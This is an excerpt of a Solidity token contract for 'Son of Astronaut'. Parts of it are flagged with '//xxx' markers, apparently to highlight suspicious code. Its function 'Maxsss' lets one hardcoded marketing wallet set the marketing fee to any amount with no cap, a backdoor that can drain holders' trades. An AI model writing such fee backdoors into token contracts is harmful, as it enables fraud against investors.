...
//xxx token info
contract SonofAstronaut is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress =
        payable(0x4A794AA390Be273897801F9e2b739d1f38e523dA);
        
    address payable public liquidityAddress =
        payable(0x608e382Fa5570A6209A59Bb3816B6Eea7206742A);
    ...
    string private constant _name = "Son of Astronaut";
    ...
    uint256 public _LiquidityFees = 3;
    ...
    uint256 private maximumTokensSwap = _tTotal * 3 / 100;
    ...
    //xxx dev info
    constructor() {
        address newOwner = address(0x608e382Fa5570A6209A59Bb3816B6Eea7206742A);
        ...
        maximumTokensSwap = _tTotal * 3 / 100; 
    ...
    //xxx
    function Maxsss(uint256 maxnum)
        public { require(msg.sender==marketingAddress);
        _MarketingFees = maxnum;
        emit SetFees(0, 0, maxnum, 0);
    }
